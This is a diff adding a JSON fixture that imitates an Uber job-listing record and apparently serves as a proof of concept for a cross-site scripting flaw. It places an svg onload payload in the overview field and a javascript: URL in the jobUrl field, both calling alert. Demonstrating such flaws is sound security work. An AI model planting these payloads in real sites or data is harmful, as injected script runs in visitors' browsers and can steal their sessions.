@@ -1,0 +1,23 @@
+{  
+   "id":"9999",
+   "title":"XSS on Uber.com",
+   "overview":"<svg onload=\"alert('XSS on '+ document.domain)\">",
+   "responsibilities":null,
+   "qualifications":null,
+   "lastUpdated":"2016-01-16 06:29 AM",
+   "formattedTeam":"xss",
+   "team":"xss",
+   "subTeam":"xss",
+   "formattedLocation":"xss",
+   "slugs":{  
+      "team":"xss",
+      "subTeam":"xss",
+      "city":"xss",
+      "country":"xss"
+   },
+   "city":"xss",
+   "country":"xss",
+   "jobUrl":"javascript:alert('XSS on '+ document.domain)",
+   "normalizedTitle":"xss",
+   "normalizedContent":"xss"
+}
